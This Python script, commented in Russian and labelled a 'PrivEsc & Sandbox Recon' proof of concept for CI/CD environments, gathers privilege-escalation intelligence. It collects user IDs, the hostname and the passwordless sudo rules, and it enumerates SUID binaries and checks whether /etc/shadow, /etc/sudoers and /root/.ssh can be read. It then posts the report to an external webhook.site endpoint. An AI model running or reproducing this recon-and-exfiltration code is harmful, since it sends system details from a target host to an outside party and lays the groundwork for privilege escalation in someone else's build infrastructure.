import os
import sys
import platform
import socket
import json
import time
import subprocess
import requests

WEBHOOK_URL = "https://webhook.site/bfd5d8c0-55a2-434a-a854-5b1d2508e0b4"

def get_privileges_and_sudo():
    """Проверка прав текущего пользователя и конфигурации sudo"""
    priv_info = {
        "uid": os.getuid(),
        "gid": os.getgid(),
        "username": os.getenv("USER", "unknown"),
        "sudo_no_passwd": "Not Available"
    }
    
    # Проверяем, может ли пользователь выполнять sudo без пароля
    try:
        res = subprocess.run(["sudo", "-n", "-l"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=2)
        if res.returncode == 0:
            priv_info["sudo_no_passwd"] = res.stdout.strip().split("\n")
        else:
            priv_info["sudo_no_passwd"] = "Restricted or Password Required"
    except Exception as e:
        priv_info["sudo_no_passwd"] = f"Error checking: {str(e)}"
        
    return priv_info

def find_suid_binaries():
    """Поиск файлов с установленным SUID-битом (ограниченный поиск по ключевым путям для скорости)"""
    suid_files = []
    search_paths = ["/bin", "/sbin", "/usr/bin", "/usr/sbin", "/usr/local/bin"]
    
    for path in search_paths:
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                # Ограничиваем глубину, чтобы не тратить время
                for file in files:
                    full_path = os.path.join(root, file)
                    try:
                        if os.path.exists(full_path) and not os.path.islink(full_path):
                            stat = os.stat(full_path)
                            # Проверка SUID бита (0o4000)
                            if stat.st_mode & 0o4000:
                                suid_files.append(full_path)
                    except Exception:
                        pass
                break # Проверяем только верхний уровень папки для быстродействия
    return suid_files

def audit_sensitive_files():
    """Проверка доступа на чтение к чувствительным файлам ОС"""
    sensitive_paths = ["/etc/passwd", "/etc/shadow", "/etc/sudoers", "/root/.ssh"]
    access_report = {}
    
    for path in sensitive_paths:
        try:
            readable = os.access(path, os.R_OK)
            access_report[path] = "Readable" if readable else "Access Denied / Protected"
        except Exception:
            access_report[path] = "Not Found"
            
    return access_report

if __name__ == "__main__":
    print("[*] Запуск глубокого модуля PrivEsc & Sandbox Recon v3.0...")
    start_time = time.time()
    
    report = {
        "poc_name": "CI/CD Deep Privilege & System Audit",
        "timestamp": time.time(),
        "hostname": socket.gethostname(),
        "privileges": get_privileges_and_sudo(),
        "sensitive_files_access": audit_sensitive_files(),
        "suid_sample": find_suid_binaries(),
        "execution_time_seconds": round(time.time() - start_time, 4)
    }
    
    print("[+] Глубокий аудит завершен. Отправка отчета...")
    print(json.dumps(report, indent=2, ensure_ascii=False))
    
    try:
        response = requests.post(WEBHOOK_URL, json=report, timeout=10)
        print(f"[+] Телеметрия доставлена. Статус: {response.status_code}")
    except Exception as e:
        print(f"[-] Ошибка отправки: {e}")
